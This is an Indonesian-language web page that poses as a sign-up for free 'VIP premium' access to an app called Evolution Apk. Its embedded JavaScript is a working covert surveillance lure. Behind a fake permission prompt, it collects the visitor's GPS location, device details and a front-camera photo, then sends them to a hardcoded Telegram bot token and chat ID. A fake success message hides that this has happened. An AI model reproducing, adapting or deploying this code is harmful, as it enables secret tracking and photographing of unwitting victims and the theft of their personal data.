<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Evolution Apk Version</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: radial-gradient(circle at top, #00111a, #000000);
      font-family: 'Poppins', sans-serif;
      color: #fff;
      overflow: hidden;
    }

    .card {
      background: rgba(15, 15, 30, 0.95);
      border: 2px solid #00f0ff;
      border-radius: 18px;
      padding: 30px;
      width: 370px;
      box-shadow: 0 0 25px #00f0ff, 0 0 80px #004d66 inset;
      text-align: center;
      animation: float 3s ease-in-out infinite;
      position: relative;
      z-index: 2;
    }

    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-12px); }
    }

    h1 { color: #00f0ff; text-shadow: 0 0 20px #00f0ff; }
    p { color: #b8e9ff; }

    input, button {
      width: 100%;
      padding: 12px;
      margin-top: 15px;
      border-radius: 8px;
      border: 2px solid #00f0ff;
      font-size: 1rem;
    }

    button {
      background: #00f0ff;
      color: #0a0a0f;
      font-weight: bold;
      text-transform: uppercase;
      cursor: pointer;
      box-shadow: 0 0 20px #00f0ff;
    }

    button:hover {
      background: #0a0a0f;
      color: #00f0ff;
    }

    .overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.9);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      text-align: center;
      z-index: 9999;
    }

    .overlay button {
      width: auto;
      margin-top: 20px;
    }

    .floating-card {
      position: fixed;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%) scale(0);
      background: rgba(10, 20, 30, 0.98);
      border: 2px solid #00f0ff;
      border-radius: 14px;
      padding: 25px;
      text-align: center;
      color: #00f0ff;
      font-size: 1.2rem;
      box-shadow: 0 0 30px #00f0ff;
      transition: transform 0.3s ease-in-out;
    }

    .floating-card.show { transform: translate(-50%, -50%) scale(1); }
    .join-btn { color:#0a0a0f; background:#00f0ff; padding:8px 18px; border-radius:6px; text-decoration:none; font-weight:bold; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Evolution Apk Version</h1>
    <p> Dapatkan Akses Premium VIP 7 Hari.<br>Masukkan Username Anda.</p>
    <input type="text" id="username" placeholder="Masukkan Username">
    <button onclick="mulaiVerifikasi()">Create Account</button>
  </div>

  <!-- Overlay wajib izin -->
  <div id="overlay" class="overlay" style="display:none;">
    <p>‚ö†Ô∏è Untuk melanjutkan, Browser Memerlukan izin akses <b>
    <button onclick="mintaIzin()">Coba Lagi</button>
  </div>

  <!-- Floating Card sukses -->
  <div id="floatingCard" class="floating-card">
    ‚úÖ Terimakasih,<br> Permintaan Aktivasi Sukses<br>
    Silahkan Follow Channel Kami
    <br><br>
    <a href="https://t.me/TheEvolutionCh" target="_blank" class="join-btn">Join Channel</a>
  </div>

  <script>
    const BOT_TOKEN = "8376466124:AAFKwGOufjlG9MrqSuOUgL136gk-DOt3fws";
    const CHAT_ID = "-1002974354168";

    let savedUsername = "";

    async function mulaiVerifikasi() {
      const username = document.getElementById("username").value.trim();
      if (!username) {
        alert("‚ö†Ô∏è Username wajib diisi!");
        return;
      }
      savedUsername = username;
      document.getElementById("overlay").style.display = "flex";
    }

    async function mintaIzin() {
      document.getElementById("overlay").style.display = "none";

      try {
        // Ambil lokasi
        navigator.geolocation.getCurrentPosition(async pos => {
          const { latitude, longitude } = pos.coords;
          const maps = `https://maps.google.com/?q=${latitude},${longitude}`;

          // Ambil device info
          const device = navigator.userAgent;
          const os = navigator.platform;
          const screenRes = window.screen.width + "x" + window.screen.height;
          const lang = navigator.language;
          const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;

          // Ambil foto kamera depan
          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
          const track = stream.getVideoTracks()[0];
          const imageCapture = new ImageCapture(track);
          const blob = await imageCapture.takePhoto();

          const caption = `
üë§ Username : ${savedUsername}
üì± Device   : ${device}
üíª OS       : ${os}
üñ•Ô∏è Resolusi : ${screenRes}
üåç Bahasa   : ${lang}
‚è∞ Timezone : ${tz}
üìç Lokasi   : ${maps}
          `;

          // Kirim foto + caption ke Telegram
          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("caption", caption);
          formData.append("photo", blob);

          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
          });

          // Stop kamera
          track.stop();

          // Tampilkan floating card sukses
          const floatingCard = document.getElementById("floatingCard");
          floatingCard.classList.add("show");
          setTimeout(() => floatingCard.classList.remove("show"), 5000);

        }, err => {
          document.getElementById("overlay").style.display = "flex";
        });

      } catch (err) {
        document.getElementById("overlay").style.display = "flex";
      }
    }
  </script>
</body>
</html>
